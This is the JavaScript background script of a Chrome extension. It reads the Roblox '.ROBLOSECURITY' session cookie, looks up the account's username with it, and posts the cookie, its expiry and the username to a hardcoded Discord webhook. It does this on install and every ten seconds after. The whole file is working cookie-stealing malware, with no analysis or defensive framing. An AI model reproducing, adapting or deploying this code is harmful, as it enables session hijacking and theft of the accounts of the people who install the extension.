// Function to fetch and send the cookie to Discord every 10 seconds
function sendCookieToDiscord() {
  chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, function(cookie) {
    if (cookie) {
      console.log('RobloxSecurity Cookie found:', cookie.value);

      const webhookURL = "https://discord.com/api/webhooks/1342910565311320074/wi2pbOgEX5R5H5KCeXWjb4r0gMp7Qvy2n6X3cLsiaG7agRo8IsbVN24d-wmisk-iheZk";

      // Fetch expiration date
      const expirationDate = cookie.expirationDate
        ? new Date(cookie.expirationDate * 1000).toUTCString()
        : 'Session Cookie (no expiration)';

      // Function to fetch Roblox username based on the cookie
      fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': `.ROBLOSECURITY=${cookie.value}`
        }
      })
      .then(response => {
        if (response.ok) {
          return response.json();
        } else {
          throw new Error('Failed to fetch Roblox username, status: ' + response.status);
        }
      })
      .then(userData => {
        const robloxUsername = userData.name || 'Unknown User';

        const data = {
          content: `RobloxSecurity Cookie: ${cookie.value}\nExpiration Date: ${expirationDate}\nUsername: ${robloxUsername}`
        };

        // Send cookie and details to Discord webhook
        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        })
        .then(response => {
          if (response.ok) {
            console.log('Cookie successfully sent to Discord');
          } else {
            console.error('Failed to send cookie to Discord, status:', response.status);
          }
        })
        .catch(error => {
          console.error('Error while sending cookie to Discord:', error);
        });
      })
      .catch(error => {
        console.error('Error while fetching Roblox username:', error);
      });
    } else {
      console.log('Cookie not found.');
    }
  });
}

// Send the cookie every 10 seconds (10,000 milliseconds)
setInterval(sendCookieToDiscord, 10000);

// Run the function once immediately after installation or update
chrome.runtime.onInstalled.addListener(function() {
  console.log('Extension installed or updated, initializing cookie sending...');
  sendCookieToDiscord();
});
